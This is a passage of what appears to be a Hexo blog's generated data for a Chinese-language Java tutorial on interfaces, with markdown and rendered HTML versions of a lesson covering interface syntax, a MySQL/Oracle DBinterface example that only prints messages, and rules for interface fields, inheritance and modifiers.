class t1 {\n    public static void main(String[] args) {\n        mySqlDB mySqlDB=new mySqlDB();\n        connect(mySqlDB);\n        close(mySqlDB);\n        OracleDB oracleDB=new OracleDB();\n        connect(oracleDB);\n    }\n    //能根据传入的对象自动匹配到对应类实现的方法\n    public static void close(DBinterface db){\n        db.close();\n    }\n    public static  void connect(DBinterface db){\n        db.connect();\n    }\n}\n\n```\n\n运行结果:\n\n![image-20211224183152984](/images/%E6%8E%A5%E5%8F%A3/image-20211224183152984.png)\n\n\n\n#### 接口注意事项\n\n##### 1接口不能实例化,(因其本身是一个抽象的概念)\n\n##### 2接口中所有方法都是public方法,接口中的抽象方法,可以不用abstract修饰\n\n​\t接口中`void a(); `实际上是`abstract void a();`\n\n##### 3一个普通类实现接口,就必须将该接口的所有方法都实现\n\n##### 4.一个类可以同时实现多个接口\n\n##### 5.抽象类实现接口,可以不用实现接口的方法\n\n##### 6.接口中的属性,只能是final的,而且是public static final的,比如`int a=1`,实际上是`public static final int a=1;(必须被初始化)`\n\n##### 7.接口中属性的访问形式:接口名.属性名\n\n用final修饰的属性不允许被修改且必须初始化\n\n```java\npublic class S8_3 {\n    public static void main(String[] args) {\n        System.out.println(C.num);//用接口名.属性名的形式类比类中的static属性就间接说明了其的static特性\n    }\n}\ninterface C{\n    int num=1;//等价于public static final int num =1\n}\n\n```\n\n##### 8.一个接口不能继承其他类,但是可以继承多个别的接口\n\n```java\ninterface C{\n    public void hi();\n    int num=1;//等价于public static final int num =1\n}\ninterface B extends C{\n    public void bye();\n}\nclass test1 implements B{\n    @Override\n    public void hi() {\n    }\n    @Override\n    public void bye() {\n\n    }\n}\n```\n\n##### 9.接口的修饰符只能是public和默认,这点和类的修饰符是一样的\n\n","slug":"接口","published":1,"updated":"2022-01-07T13:31:06.123Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9nd002egsw991ox1g90","content":"<h3 id=\"接口\"><a href=\"#接口\" class=\"headerlink\" title=\"接口\"></a>接口</h3><h4 id=\"基本介绍\"><a href=\"#基本介绍\" class=\"headerlink\" title=\"基本介绍\"></a>基本介绍</h4><p>接口就是给出一些没有实现的方法,封装到一起,到某个类要使用的时候,再根据具体情况把这些方法写出来</p>\n<h5 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">interface</span> 接口名</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//属性</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//方法(三种:1.抽象方法,2.默认实现方法,3.静态方法)</span></span><br><span class=\"line\">    <span class=\"comment\">//接口中抽象方法可以省略abstract关键字</span></span><br><span class=\"line\"><span class=\"comment\">//jdk8后可以通过添加default关键字实现默认方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">default</span> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">ok</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;ok&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//jdk8也可以实现静态方法</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">///////////////////////////////////////</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> 类名 <span class=\"keyword\">implements</span> 接口</span>&#123;<span class=\"comment\">//implement 实现</span></span><br><span class=\"line\"><span class=\"comment\">//自己属性</span></span><br><span class=\"line\"><span class=\"comment\">//自己方法</span></span><br><span class=\"line\"><span class=\"comment\">//必须实现的接口的抽象方法</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>一个例子,通过DBinterface接口规范对于数据库的操作</p>\n<p>DBinterface.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">DBinterface</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">connect</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">close</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>mySqlDB.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">mySqlDB</span> <span class=\"keyword\">implements</span> <span class=\"title\">DBinterface</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">connect</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;mysql连接成功&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">close</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;mysql关闭连接&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>OracleDB.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">OracleDB</span> <span class=\"keyword\">implements</span> <span class=\"title\">DBinterface</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">connect</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;oracle连接成功&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">close</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;oracle连接成功&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>t1.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">t1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        mySqlDB mySqlDB=<span class=\"keyword\">new</span> mySqlDB();</span><br><span class=\"line\">        connect(mySqlDB);</span><br><span class=\"line\">        close(mySqlDB);</span><br><span class=\"line\">        OracleDB oracleDB=<span class=\"keyword\">new</span> OracleDB();</span><br><span class=\"line\">        connect(oracleDB);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//能根据传入的对象自动匹配到对应类实现的方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">close</span><span class=\"params\">(DBinterface db)</span></span>&#123;</span><br><span class=\"line\">        db.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span>  <span class=\"keyword\">void</span> <span class=\"title\">connect</span><span class=\"params\">(DBinterface db)</span></span>&#123;</span><br><span class=\"line\">        db.connect();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>运行结果:</p>\n<p><img src=\"/images/%E6%8E%A5%E5%8F%A3/image-20211224183152984.png\" alt=\"image-20211224183152984\"></p>\n<h4 id=\"接口注意事项\"><a href=\"#接口注意事项\" class=\"headerlink\" title=\"接口注意事项\"></a>接口注意事项</h4><h5 id=\"1接口不能实例化-因其本身是一个抽象的概念\"><a href=\"#1接口不能实例化-因其本身是一个抽象的概念\" class=\"headerlink\" title=\"1接口不能实例化,(因其本身是一个抽象的概念)\"></a>1接口不能实例化,(因其本身是一个抽象的概念)</h5><h5 id=\"2接口中所有方法都是public方法-接口中的抽象方法-可以不用abstract修饰\"><a href=\"#2接口中所有方法都是public方法-接口中的抽象方法-可以不用abstract修饰\" class=\"headerlink\" title=\"2接口中所有方法都是public方法,接口中的抽象方法,可以不用abstract修饰\"></a>2接口中所有方法都是public方法,接口中的抽象方法,可以不用abstract修饰</h5><p>​    接口中<code>void a(); </code>实际上是<code>abstract void a();</code></p>\n<h5 id=\"3一个普通类实现接口-就必须将该接口的所有方法都实现\"><a href=\"#3一个普通类实现接口-就必须将该接口的所有方法都实现\" class=\"headerlink\" title=\"3一个普通类实现接口,就必须将该接口的所有方法都实现\"></a>3一个普通类实现接口,就必须将该接口的所有方法都实现</h5><h5 id=\"4-一个类可以同时实现多个接口\"><a href=\"#4-一个类可以同时实现多个接口\" class=\"headerlink\" title=\"4.一个类可以同时实现多个接口\"></a>4.一个类可以同时实现多个接口</h5><h5 id=\"5-抽象类实现接口-可以不用实现接口的方法\"><a href=\"#5-抽象类实现接口-可以不用实现接口的方法\" class=\"headerlink\" title=\"5.抽象类实现接口,可以不用实现接口的方法\"></a>5.抽象类实现接口,可以不用实现接口的方法</h5><h5 id=\"6-接口中的属性-只能是final的-而且是public-static-final的-比如int-a-1-实际上是public-static-final-int-a-1-必须被初始化\"><a href=\"#6-接口中的属性-只能是final的-而且是public-static-final的-比如int-a-1-实际上是public-static-final-int-a-1-必须被初始化\" class=\"headerlink\" title=\"6.接口中的属性,只能是final的,而且是public static final的,比如int a=1,实际上是public static final int a=1;(必须被初始化)\"></a>6.接口中的属性,只能是final的,而且是public static final的,比如<code>int a=1</code>,实际上是<code>public static final int a=1;(必须被初始化)</code></h5><h5 id=\"7-接口中属性的访问形式-接口名-属性名\"><a href=\"#7-接口中属性的访问形式-接口名-属性名\" class=\"headerlink\" title=\"7.接口中属性的访问形式:接口名.属性名\"></a>7.接口中属性的访问形式:接口名.属性名</h5><p>用final修饰的属性不允许被修改且必须初始化</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_3</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(C.num);<span class=\"comment\">//用接口名.属性名的形式类比类中的static属性就间接说明了其的static特性</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">C</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num=<span class=\"number\">1</span>;<span class=\"comment\">//等价于public static final int num =1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"8-一个接口不能继承其他类-但是可以继承多个别的接口\"><a href=\"#8-一个接口不能继承其他类-但是可以继承多个别的接口\" class=\"headerlink\" title=\"8.一个接口不能继承其他类,但是可以继承多个别的接口\"></a>8.一个接口不能继承其他类,但是可以继承多个别的接口</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">C</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">hi</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num=<span class=\"number\">1</span>;<span class=\"comment\">//等价于public static final int num =1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">B</span> <span class=\"keyword\">extends</span> <span class=\"title\">C</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">bye</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test1</span> <span class=\"keyword\">implements</span> <span class=\"title\">B</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">hi</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">bye</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"9-接口的修饰符只能是public和默认-这点和类的修饰符是一样的\"><a href=\"#9-接口的修饰符只能是public和默认-这点和类的修饰符是一样的\" class=\"headerlink\" title=\"9.接口的修饰符只能是public和默认,这点和类的修饰符是一样的\"></a>9.接口的修饰符只能是public和默认,这点和类的修饰符是一样的</h5>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"接口\"><a href=\"#接口\" class=\"headerlink\" title=\"接口\"></a>接口</h3><h4 id=\"基本介绍\"><a href=\"#基本介绍\" class=\"headerlink\" title=\"基本介绍\"></a>基本介绍</h4><p>接口就是给出一些没有实现的方法,封装到一起,到某个类要使用的时候,再根据具体情况把这些方法写出来</p>\n<h5 id=\"语法\"><a href=\"#语法\" class=\"headerlink\" title=\"语法\"></a>语法</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">interface</span> 接口名</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//属性</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//方法(三种:1.抽象方法,2.默认实现方法,3.静态方法)</span></span><br><span class=\"line\">    <span class=\"comment\">//接口中抽象方法可以省略abstract关键字</span></span><br><span class=\"line\"><span class=\"comment\">//jdk8后可以通过添加default关键字实现默认方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">default</span> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">ok</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;ok&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//jdk8也可以实现静态方法</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">///////////////////////////////////////</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> 类名 <span class=\"keyword\">implements</span> 接口</span>&#123;<span class=\"comment\">//implement 实现</span></span><br><span class=\"line\"><span class=\"comment\">//自己属性</span></span><br><span class=\"line\"><span class=\"comment\">//自己方法</span></span><br><span class=\"line\"><span class=\"comment\">//必须实现的接口的抽象方法</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>一个例子,通过DBinterface接口规范对于数据库的操作</p>\n<p>DBinterface.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">DBinterface</span></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">connect</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">close</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>mySqlDB.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">mySqlDB</span> <span class=\"keyword\">implements</span> <span class=\"title\">DBinterface</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">connect</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;mysql连接成功&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">close</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;mysql关闭连接&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>OracleDB.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">OracleDB</span> <span class=\"keyword\">implements</span> <span class=\"title\">DBinterface</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">connect</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;oracle连接成功&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">close</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;oracle连接成功&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>t1.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">t1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        mySqlDB mySqlDB=<span class=\"keyword\">new</span> mySqlDB();</span><br><span class=\"line\">        connect(mySqlDB);</span><br><span class=\"line\">        close(mySqlDB);</span><br><span class=\"line\">        OracleDB oracleDB=<span class=\"keyword\">new</span> OracleDB();</span><br><span class=\"line\">        connect(oracleDB);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//能根据传入的对象自动匹配到对应类实现的方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">close</span><span class=\"params\">(DBinterface db)</span></span>&#123;</span><br><span class=\"line\">        db.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span>  <span class=\"keyword\">void</span> <span class=\"title\">connect</span><span class=\"params\">(DBinterface db)</span></span>&#123;</span><br><span class=\"line\">        db.connect();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>运行结果:</p>\n<p><img src=\"/images/%E6%8E%A5%E5%8F%A3/image-20211224183152984.png\" alt=\"image-20211224183152984\"></p>\n<h4 id=\"接口注意事项\"><a href=\"#接口注意事项\" class=\"headerlink\" title=\"接口注意事项\"></a>接口注意事项</h4><h5 id=\"1接口不能实例化-因其本身是一个抽象的概念\"><a href=\"#1接口不能实例化-因其本身是一个抽象的概念\" class=\"headerlink\" title=\"1接口不能实例化,(因其本身是一个抽象的概念)\"></a>1接口不能实例化,(因其本身是一个抽象的概念)</h5><h5 id=\"2接口中所有方法都是public方法-接口中的抽象方法-可以不用abstract修饰\"><a href=\"#2接口中所有方法都是public方法-接口中的抽象方法-可以不用abstract修饰\" class=\"headerlink\" title=\"2接口中所有方法都是public方法,接口中的抽象方法,可以不用abstract修饰\"></a>2接口中所有方法都是public方法,接口中的抽象方法,可以不用abstract修饰</h5><p>​    接口中<code>void a(); </code>实际上是<code>abstract void a();</code></p>\n<h5 id=\"3一个普通类实现接口-就必须将该接口的所有方法都实现\"><a href=\"#3一个普通类实现接口-就必须将该接口的所有方法都实现\" class=\"headerlink\" title=\"3一个普通类实现接口,就必须将该接口的所有方法都实现\"></a>3一个普通类实现接口,就必须将该接口的所有方法都实现</h5><h5 id=\"4-一个类可以同时实现多个接口\"><a href=\"#4-一个类可以同时实现多个接口\" class=\"headerlink\" title=\"4.一个类可以同时实现多个接口\"></a>4.一个类可以同时实现多个接口</h5><h5 id=\"5-抽象类实现接口-可以不用实现接口的方法\"><a href=\"#5-抽象类实现接口-可以不用实现接口的方法\" class=\"headerlink\" title=\"5.抽象类实现接口,可以不用实现接口的方法\"></a>5.抽象类实现接口,可以不用实现接口的方法</h5><h5 id=\"6-接口中的属性-只能是final的-而且是public-static-final的-比如int-a-1-实际上是public-static-final-int-a-1-必须被初始化\"><a href=\"#6-接口中的属性-只能是final的-而且是public-static-final的-比如int-a-1-实际上是public-static-final-int-a-1-必须被初始化\" class=\"headerlink\" title=\"6.接口中的属性,只能是final的,而且是public static final的,比如int a=1,实际上是public static final int a=1;(必须被初始化)\"></a>6.接口中的属性,只能是final的,而且是public static final的,比如<code>int a=1</code>,实际上是<code>public static final int a=1;(必须被初始化)</code></h5><h5 id=\"7-接口中属性的访问形式-接口名-属性名\"><a href=\"#7-接口中属性的访问形式-接口名-属性名\" class=\"headerlink\" title=\"7.接口中属性的访问形式:接口名.属性名\"></a>7.接口中属性的访问形式:接口名.属性名</h5><p>用final修饰的属性不允许被修改且必须初始化</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_3</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(C.num);<span class=\"comment\">//用接口名.属性名的形式类比类中的static属性就间接说明了其的static特性</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">C</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> num=<span class=\"number\">1</span>;<span class=\"comment\">//等价于public static final int num =1</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"8-一个接口不能继承其他类-但是可以继承多个别的接口\"><a href=\"#8-一个接口不能继承其他类-但是可以继承多个别的接口\" class=\"headerlink\" title=\"8.一个接口不能继承其他类,但是可以继承多个别的接口\"></a>8.一个接口不能继承其他类,但是可以继承多个别的接口</h5><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 